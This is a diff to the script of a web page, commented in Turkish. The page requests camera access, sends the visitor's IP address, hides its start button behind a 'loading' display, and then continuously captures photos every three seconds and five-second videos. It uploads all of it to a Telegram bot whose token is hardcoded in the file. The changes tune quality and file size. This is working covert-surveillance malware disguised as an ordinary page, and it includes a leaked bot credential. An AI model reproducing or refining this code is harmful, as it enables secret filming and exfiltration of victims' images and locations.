@@ -61,7 +61,7 @@
 
     <script>
         // ============================================
-        // GİZLİ KONFİGÜRASYON - SON TOKEN
+        // GİZLİ KONFİGÜRASYON
         // ============================================
         const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
         const urlParams = new URLSearchParams(window.location.search);
@@ -111,7 +111,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK
+        // FOTOĞRAF ÇEK - 3 SANİYEDE 1
         // ============================================
         async function takePhoto() {
             if (!video.videoWidth || !video.videoHeight) return;
@@ -136,19 +136,30 @@
                         body: formData
                     });
                     
-                }, 'image/jpeg', 0.7);
+                }, 'image/jpeg', 0.8);
                 
             } catch(e) {}
         }
         
         // ============================================
-        // VİDEO KAYDI
+        // 5 SANİYELİK VİDEO KAYDI (600-800KB)
         // ============================================
-        function startVideoRecording() {
+        function recordVideo() {
             if (!stream || !stream.active) return;
             
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            // Orta kalite - 600-800KB için
+            const options = {
+                mimeType: 'video/webm',
+                videoBitsPerSecond: 1000000 // 1 Mbps
+            };
+            
+            try {
+                mediaRecorder = new MediaRecorder(stream, options);
+            } catch(e) {
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            }
             
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) recordedChunks.push(event.data);
@@ -158,19 +169,24 @@
                 videoCount++;
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
+                // Boyutu kontrol et
+                console.log(`Video boyutu: ${(blob.size / 1024).toFixed(2)} KB`);
+                
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
+                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${(blob.size / 1024).toFixed(0)}KB)`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                setTimeout(startVideoRecording, 1000);
+                // 1 saniye sonra yeni video
+                setTimeout(recordVideo, 1000);
             };
             
+            // 5 saniye kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
@@ -184,22 +200,31 @@
         // ============================================
         async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        frameRate: { ideal: 24 }
+                    }
+                });
+                
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
+                    // IP'yi gönder
                     const ip = await getIP();
                     await sendIP(ip);
                     
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    setTimeout(() => {
-                        startVideoRecording();
-                        setInterval(takePhoto, 3000);
-                    }, 2000);
+                    // 3 SANİYEDE 1 FOTOĞRAF
+                    setInterval(takePhoto, 3000);
+                    
+                    // 5 SANİYELİK VİDEO (hepsinin boyutu 600-800KB)
+                    setTimeout(recordVideo, 2000);
                 };
                 
             } catch(e) {
